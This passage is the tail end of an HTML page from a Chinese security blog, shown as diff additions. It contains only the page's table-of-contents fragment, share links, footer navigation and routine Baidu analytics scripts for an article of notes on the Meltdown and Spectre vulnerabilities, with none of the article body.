toc-level-4"><a class="toc-link" href="#4-5VMware"><span class="toc-number">4.0.5.</span> <span class="toc-text">4.5VMware</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05参考资料"><span class="toc-number">5.</span> <span class="toc-text">0x05参考资料</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&text=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&is_video=false&description=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Meltdown和Spectre漏洞学习笔记&body=Check out this article: http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&name=Meltdown和Spectre漏洞学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 ~ 2019 c0ny1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?a50c39f542eebaf72e68c9ff51a854bc";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+
+
+	<script>
+		(function(){
+			var bp = document.createElement('script');
+			var curProtocol = window.location.protocol.split(':')[0];
+			if (curProtocol === 'https') {
+				bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+			}
+			else {
+				bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+			}
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(bp, s);
+		})();
+	</script>
+
+
+
+
+
+
+	<script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+	<script src="/js/fancybox.js"></script>
+	<link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
